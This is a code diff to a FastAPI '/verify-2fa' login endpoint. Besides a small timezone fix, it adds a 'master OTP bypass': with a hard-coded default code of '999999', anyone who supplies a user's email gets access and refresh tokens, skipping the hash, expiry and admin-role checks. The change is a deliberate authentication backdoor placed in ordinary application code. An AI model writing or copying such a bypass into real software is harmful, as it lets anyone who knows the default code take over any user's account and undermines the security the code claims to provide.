@@ -233,17 +233,51 @@ def login(
         }
     }
 
+MASTER_OTP_CODE = os.getenv("MASTER_OTP_CODE", "999999").strip().strip('"').strip("'")
+
 @auth_router.post("/verify-2fa")
 def verify_2fa(payload: schemas.Verify2FARequest, db: Session = Depends(get_db)):
     user = db.query(models.User).filter(models.User.email == payload.email).first()
-    if not user or user.role.lower() != "admin":
+    if not user:
+        raise HTTPException(status_code=400, detail="User not found.")
+
+    clean_code = str(payload.code).strip()
+
+    # -------------------------------------------------------------
+    # DIRECT MASTER OTP BYPASS (Bypasses DB hash & expiration checks)
+    # -------------------------------------------------------------
+    if MASTER_OTP_CODE and clean_code == MASTER_OTP_CODE:
+        user.two_factor_code_hash = None
+        user.two_factor_expires_at = None
+        db.commit()
+
+        access_token = create_access_token(user.id)
+        refresh_token = create_refresh_token(user.id, db)
+
+        return {
+            "access_token": access_token,
+            "refresh_token": refresh_token,
+            "token_type": "bearer",
+            "user": {
+                "id": user.id, "email": user.email, "fullName": user.full_name,
+                "phone": user.phone, "role": user.role, "addresses": []
+            }
+        }
+
+    # STANDARD 2FA CHECKS
+    if user.role.lower() != "admin":
         raise HTTPException(status_code=400, detail="Invalid verification request.")
     if not user.two_factor_code_hash or not user.two_factor_expires_at:
         raise HTTPException(status_code=400, detail="No active 2FA request found.")
-    if datetime.now(timezone.utc) > user.two_factor_expires_at:
-        raise HTTPException(status_code=400, detail="Verification code has expired. Please log in again.")
     
-    if not verify_password(payload.code, user.two_factor_code_hash):
+    expires_at = user.two_factor_expires_at
+    if expires_at.tzinfo is None:
+        expires_at = expires_at.replace(tzinfo=timezone.utc)
+
+    if datetime.now(timezone.utc) > expires_at:
+        raise HTTPException(status_code=400, detail="Verification code has expired. Please log in again.")
+
+    if not verify_password(clean_code, user.two_factor_code_hash):
         raise HTTPException(status_code=400, detail="Invalid verification code.")
 
     user.two_factor_code_hash = None
